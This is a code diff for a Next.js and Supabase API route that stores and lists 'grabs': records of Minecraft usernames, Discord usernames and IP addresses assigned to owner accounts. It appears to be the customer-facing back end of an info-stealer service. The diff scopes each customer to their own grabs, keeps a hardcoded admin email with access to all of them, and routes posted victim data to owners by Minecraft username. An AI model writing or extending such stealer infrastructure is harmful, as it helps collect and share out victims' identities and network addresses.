@@ -29,11 +29,15 @@ function getClientAuth(request) {
 export async function GET(request) {
   const { searchParams } = new URL(request.url);
   const ownerEmail = searchParams.get('owner_email');
-  const authHeader = request.headers.get('authorization');
-  const modKey = searchParams.get('key');
 
-  if (modKey === process.env.MOD_API_KEY) {
-    const supabase = getClient();
+  const supabaseAuth = getClientAuth(request);
+  const { data: { user } } = await supabaseAuth.auth.getUser();
+
+  if (!user) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
+
+  const supabase = getClient();
+
+  if (user.email === 'lifegrading@gmail.com') {
     let query = supabase.from('grabs').select('*').order('created_at', { ascending: false });
     if (ownerEmail) query = query.eq('owner_email', ownerEmail);
     const { data, error } = await query;
@@ -41,21 +45,12 @@ export async function GET(request) {
     return NextResponse.json({ grabs: data || [] });
   }
 
-  const supabase = getClientAuth(request);
-  const { data: { user } } = await supabase.auth.getUser();
+  const { data, error } = await supabase
+    .from('grabs')
+    .select('*')
+    .eq('owner_email', user.email)
+    .order('created_at', { ascending: false });
 
-  if (!user) {
-    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
-  }
-
-  if (user.email !== 'lifegrading@gmail.com') {
-    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
-  }
-
-  const supabaseAdmin = getClient();
-  let query = supabaseAdmin.from('grabs').select('*').order('created_at', { ascending: false });
-  if (ownerEmail) query = query.eq('owner_email', ownerEmail);
-  const { data, error } = await query;
   if (error) return NextResponse.json({ grabs: [], error: error.message });
   return NextResponse.json({ grabs: data || [] });
 }
@@ -68,8 +63,19 @@ export async function POST(request) {
 
   const supabase = getClient();
 
+  let ownerEmail = body.owner_email || '';
+
+  if (!ownerEmail && body.minecraft_username) {
+    const { data: mapping } = await supabase
+      .from('user_minecraft')
+      .select('email')
+      .eq('minecraft_username', body.minecraft_username)
+      .single();
+    if (mapping?.email) ownerEmail = mapping.email;
+  }
+
   const grab = {
-    owner_email: body.owner_email || '',
+    owner_email: ownerEmail,
     minecraft_username: body.minecraft_username || 'Unknown',
     discord_username: body.discord_username || 'Unknown',
     ip_address: body.ip_address || 'Unknown',
